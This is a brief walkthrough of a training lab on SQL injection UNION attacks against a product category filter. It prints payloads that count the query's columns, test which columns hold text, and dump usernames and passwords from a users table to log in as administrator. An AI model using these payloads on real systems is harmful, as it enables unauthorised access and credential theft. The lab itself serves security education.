## Lab: SQL injection UNION attack, retrieving data from other tables.

- This lab contains a SQL injection vulnerability in the product category filter.
- The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables.

# The database contains a different table called `users`, with columns called `username` and `password`.

# To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.

# Use Burp Suite to intercept and modify the request that sets the product category filter.

# Determine the number of columns that are being returned by the query and which columns contain text data.

# check columns
```
' UNION SELECT NULL,NULL--
```
- there are two columns.

# check which column contain text
```
'UNION SELECT NULL,'def'--
'UNION SELECT 'abc',NULL--
'UNION SELECT 'abc','def'--
```
- Both contains text.

# now let's try to access username and password from user table.
```
'UNION SELECT username,password FROM users--
```
- With this payload we can get some usernames and password in body section.
![lab_s9](Images/L9userpassword.png)

# Now copy administrator login details and login.
![lab_s9](Images/L9solved.png)
